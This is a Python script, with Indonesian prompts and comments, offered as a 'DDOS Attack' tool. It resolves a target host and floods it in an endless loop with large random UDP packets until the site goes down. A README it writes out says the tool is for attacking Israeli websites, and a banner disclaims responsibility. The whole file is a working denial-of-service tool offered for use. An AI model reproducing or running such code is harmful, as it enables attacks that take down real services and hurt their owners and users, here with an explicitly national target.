
"""Script yang kami buat bersifat OPEN SOURCE"""

import os, sys, time, socket, string, random
 
os.system('scroll')

print ("\n [*] Memulai Program....\n")
time.sleep(3)
print (" [..............................] %0")
time.sleep(3)
print (" [>>>>>>>>>>>>..................] %40")
time.sleep(3)
print (" [>>>>>>>>>>>>>>>>>>>...........] %62")
time.sleep(4)
print (" [>>>>>>>>>>>>>>>>>>>>>>>>>>>>..] %94")
time.sleep(5)
print (" [>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>] %100\n")
time.sleep (4)
print (" [*] Membuka Program....\n")
time.sleep(3)

print ("#----------------------------------------------------------------#")
print ("<|-----------------------| DDOS Attack |------------------------|>")
print (" | Author:             RX77E, Security Syber Team Indonean      |")
print (" | Spesial Thank's:    RX77E                                    |")
print (" | Github:             https://github.com/Sreetx                |")
print (" | Instagram:          https://www.instagram.com/memelucubikin  |")
print (" |--------------------------------------------------------------|")
print (" |    Jangan gunakan script ini untuk tindak kejahatan. Kami    |")
print (" |    tidak bertanggung jawab atas apapun yang anda lakukan.    |")
print ("<|--------------------------------------------------------------|>")
print ("#----------------------------------------------------------------#")

print ("""Deskripsi:
Cara kerja tool's DDOS Attack yg kami buat adalah mengirimkan lonjakan tekanan yang sangat besar pada web tersebut sampai web tersebut down. Untuk mengisi menu ke4, sebaiknya anda pasang ukuran yg besar(tergantung pada kuota data anda) agar web target kalian cepat down. Note: Lebih baik gunakan wifi.""")

print ("""\n Info: Tekan CTRL+C Untuk Keluar
       Max paket yang dapat dikirim: 15500MB
       Untuk pengguna dengan koneksi lemah, lebih baik langsung masukkan IP di
       pilihan pertama: "Masukan Alamat Server"
       Kami menggunakan 3 socket untuk penyerangan\n""")

try:
    tanya = input (" [?] Ingin Membaca Readmie/Tentang? [Y/n]: ")
    if tanya.lower() == 'y':
        print ("\n[</>] Menyiapkan File...")
        open("READMIE.txt", "w").write("""                         DDOS AttackV2.1
Script DDOS Attack yang kami buat digunakan untuk menyerang website website milik Israel. Jangan gunakan script ini untuk tindak kejahatan seperti menyerang web milik negara sendiri, dan menyerang website milik negara lain. Cukup gunakan script ini untuk menyerang website isreal. {[!] Penting: Kami tidak bertanggung jawab atas apapun yang anda lakukan apapun itu.}

Follow dan subscribe beberapa akun kami yaakk...

 Github:
        https://github.com/Sreetx/
 Intagram:
        https://www.instagram.com/memelucubikin/
 YouTube:
        https://youtube.com/channel/UCscuxW-ZUViftGyJ9Z1cPbw/
 Website:
        https://progpem.blogspot.com/2022/04/hom.html/
        
Segitu aja ya guys by semua...""")
        print (" [</>] Selesai")
        
    host = input("\n[?] Masukan Alamat Server: ")
    port = input("[?] Masukan Port: ")
    paket = input("[?] Berapa ukuran paket yang ingin anda kirimkan(MB): ")
    ip = socket.gethostbyname(host)
    print ("[*] Mendapatkan IP: [" + ip +"]")
    time.sleep(3)
    print ("[*] [Ip Terkunci]" )
    time.sleep(3)
    print ("[*] Memulai Menyerang [" + host + "]....")
    time.sleep(3)
except socket.gaierror: print (" [!] Gagal mendapatkan IP...\n");sys.exit()
except KeyboardInterrupt: print ("\n [*] Mematikan Program....\n");time.sleep(3);sys.exit()
except EOFError: print ("\n [*] Mematikan Program....\n");time.sleep(3);sys.exit()

def ddos():
    try:
        ddos = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(50000 + int(paket))
        sent = 50000 + int(paket)
        ddos.connect((ip, int(port)))
        ddos.sendto(bytes, (ip, int(port)))
        sent = sent + 1
        print (" [*] Menyerang "+ ip +" Di Port "+ port +" Dengan Ukuran "+ paket +"MB")
    except socket.error: print ("""\n [!] Anda Sedang Offline... Atau target anda sudah down
 [#] Restart script ini atau sumber internet anda
 [#] Mungkin paket yang anda masukan terlalu besar
 [#] Max paket: 15500MB. Paket yang anda masukkan """+ paket +"""MB\n""");sys.exit()
    except TimeoutError: print ("[!] Koneksi internet anda terputus");sys.exit()
    except KeyboardInterrupt: print ("\n  [*] Menghentikan Penyerangan....");time.sleep(1);print ("  [*] Mematikan Program....\n");time.sleep(3);sys.exit()

def ddos2():
    try:
        ddos = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(50000 + int(paket))
        sent = 50000 + int(paket)
        ddos.connect((ip, int(port)))
        ddos.sendto(bytes, (ip, int(port)))
        sent = sent + 1
    except TimeoutError: print ("[!] Koneksi internet anda terputus");sys.exit()
    except KeyboardInterrupt: print ("\n  [*] Menghentikan Penyerangan....");time.sleep(1);print ("  [*] Mematikan Program....\n");time.sleep(3);sys.exit()

def ddos3():
    try:
        ddos = socket.socket(socket.AF_INET, socket.SOCK_RAW)
        bytes = random._urandom(50000 + int(paket))
        sent = 50000 + int(paket)
        ddos.sendto(bytes, (ip, int(port)))
        sent = sent + 1
    except TimeoutError: print ("[!] Koneksi internet anda terputus");sys.exit()
    except KeyboardInterrupt: print ("\n  [*] Menghentikan Penyerangan....");time.sleep(1);print ("  [*] Mematikan Program....\n");time.sleep(3);sys.exit()

def ddos4():
    try:
        ddos = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(50000 + int(paket))
        sent = 50000 + int(paket)
        ddos.connect((ip, int(port)))
        ddos.sendto(bytes, (ip, int(port)))
        sent = sent + 1
        print (" [*] Menyerang "+ ip +" Di Port "+ port +" Dengan Ukuran "+ paket +"MB")
    except TimeoutError: print ("[!] Koneksi internet anda terputus");sys.exit()
    except KeyboardInterrupt: print ("\n  [*] Menghentikan Penyerangan....");time.sleep(1);print ("  [*] Mematikan Program....\n");time.sleep(3);sys.exit()
    
while True:
    try:
        ddos()
        ddos2()
        ddos3()
        ddos4()
    except KeyboardInterrupt: sys.exit()
        